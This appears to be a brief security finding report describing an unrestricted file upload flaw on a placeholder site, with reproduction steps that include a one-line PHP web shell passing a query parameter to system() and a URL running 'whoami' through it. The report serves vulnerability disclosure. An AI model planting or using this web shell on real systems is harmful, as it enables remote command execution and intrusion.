title: Unrestricted File Upload Vulnerability
description: The file upload functionality at /upload.php allows users to upload arbitrary files without proper validation. This can lead to remote code execution if PHP files are uploaded.
steps_to_reproduce:
1. Navigate to https://vulnerable-app.com/upload.php
2. Create a PHP file with content: <?php system($_GET['cmd']); ?>
3. Upload the file through the form
4. Access the uploaded file at https://vulnerable-app.com/uploads/malicious.php?cmd=whoami
5. The system command will execute
